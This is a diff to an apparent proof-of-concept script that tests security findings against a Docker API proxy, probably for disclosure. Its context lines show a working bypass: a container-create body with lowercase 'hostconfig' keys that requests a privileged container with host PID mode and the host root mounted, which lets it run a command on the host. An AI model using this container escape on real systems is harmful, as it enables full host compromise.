@@ -9,7 +9,7 @@
 # exits 2 if the proxy refuses it (finding closed on that instance).
 #
 #   usage:  poc-suite.sh <name>
-#   names:  1a   #1 top-level lowercase `hostconfig`      → pop calc (host PID ns)
+#   names:  1a   #1 top-level lowercase `hostconfig`      → pop calc (Go merges dupes)
 #           1b   #1 nested lowercase keys under HostConfig → pop calc (host PID ns)
 #           1c   #1 minimal: `binds` only                 → host-fs read+write
 #           fs   #1 filesystem-only calc pop               → PS profile injection
@@ -153,7 +153,7 @@ case "$NAME" in
   CID=$(create_raw "huddle-$STAMP" \
     "{\"Image\":\"$IMAGE\",\"Cmd\":$(cmd_json "$CALC_ON_HOST"),\"hostconfig\":{\"privileged\":true,\"pidmode\":\"host\",\"binds\":[\"/:/host\"]}}")
   [[ -z "$CID" ]] && refused
-  CLEAN_IDS+=("$CID"); echo "[+] created $CID (proxy saw body.HostConfig=undefined)"; run_and_log "$CID"
+  CLEAN_IDS+=("$CID"); echo "[+] created $CID (proxy saw body.HostConfig=undefined; Go merges dupe keys into same struct)"; run_and_log "$CID"
   ;;
 # ── Finding #1b: proper HostConfig, but lowercase INNER keys ──────────────────
 1b)
